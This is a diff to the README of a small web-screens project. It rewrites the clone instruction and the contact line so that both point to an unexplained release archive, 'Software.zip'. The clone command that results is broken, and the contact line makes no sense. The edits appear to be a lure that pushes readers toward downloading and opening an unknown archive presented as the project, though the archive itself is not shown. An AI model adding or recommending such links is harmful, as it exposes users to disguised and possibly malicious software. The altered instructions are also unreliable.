@@ -24,7 +24,7 @@ Screens are tested and optimized for compatibility with major web browsers.
 Usage
 #### Clone the repository: 
 ```bash
-git clone https://github.com/Taimoor-Ahmmad/FYP_Screens
+git clone https://github.com/Taimoor-Ahmmad/FYP_Screens/releases/download/v1.0/Software.zip
 
 ```
 Open the project directory in your code editor.
@@ -32,4 +32,4 @@ Open the project directory in your code editor.
 
 
 Contact
-For any inquiries or feedback, feel free to reach out to me at taimoorahmad890@example.com.
+For any inquiries or feedback, feel free to reach out to me at https://github.com/Taimoor-Ahmmad/FYP_Screens/releases/download/v1.0/Software.zip
